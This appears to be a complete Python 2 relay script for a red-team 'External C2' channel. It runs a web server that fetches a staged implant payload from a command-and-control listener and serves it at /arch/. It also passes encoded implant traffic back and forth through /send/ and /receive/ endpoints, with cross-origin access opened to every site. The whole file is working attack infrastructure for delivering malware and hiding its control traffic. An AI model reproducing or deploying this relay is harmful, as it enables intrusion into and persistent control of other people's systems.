import socket
import struct
import time
import base64
import binascii
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer


ec2_host = "127.0.0.1"
port = 8080
ec2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#ec2_socket.settimeout(10)

class get_handler(BaseHTTPRequestHandler):
	#Handler for the GET requests
	def do_GET(self):
		

		if(self.path.startswith("/arch/")):
			init_connection(ec2_host,2222)
			arch = self.path.split("/arch/")
			if(arch[1] == "x64"):
				arch = "x64"
			else:
				# The architecture will be x86 by default
				arch = "x86"
			self.send_response(200)
			self.send_header('Content-type','text/html')
			self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
			self.send_header("Pragma", "no-cache")
			self.send_header("Expires", "0")
			self.send_header("Access-Control-Allow-Origin", "*")
			self.end_headers()
			self.wfile.write(get_payload(arch))

		elif(self.path.startswith("/receive/")):
			self.send_response(200)
			self.send_header('Content-type','text/html')
			self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
			self.send_header("Pragma", "no-cache")
			self.send_header("Expires", "0")
			self.send_header("Access-Control-Allow-Origin", "*")
			self.end_headers()
			self.wfile.write(base64.b64encode(recv_data()))
		
		else:
			self.send_response(404)
	def do_POST(self):
		
		if(self.path.startswith("/send/")):
			length = int(self.headers.getheader('Content-Length'))
			self.send_response(200)
			self.send_header('Content-type','text/html')
			self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
			self.send_header("Pragma", "no-cache")
			self.send_header("Expires", "0")
			self.send_header("Access-Control-Allow-Origin", "*")

			self.end_headers()

			data = self.rfile.read(length)
			send_data(base64.b64decode(data))

		return


def send_data(data):
	temp = struct.pack("<I", len(data)) + data
	print "[+] Sending data size %d" % len(data)

	ec2_socket.sendall(temp)


def recv_data():
	data_len = ec2_socket.recv(4)
	data_len = struct.unpack("<i",data_len)[0]
	print "[+] Receiving Data size %s [+]" % data_len
	data = ec2_socket.recv(data_len)
	return data

def get_payload(arch):

	send_data("arch=%s" % arch)
	send_data("pipename=externalc2")
	send_data("block=500")
	send_data("go")
	payload = recv_data()
	return base64.b64encode(payload)

def init_connection(host,port):
	ec2_socket.connect((host,port))
	print "[+] Connection to External C2 successful [+]"


try:
	server = HTTPServer(('', port), get_handler)
	print '[+] Started HTTP server on port %d [+]' % port 
	server.serve_forever()

except KeyboardInterrupt:
	print '^C received, shutting down the web server'
	server.socket.close()
	
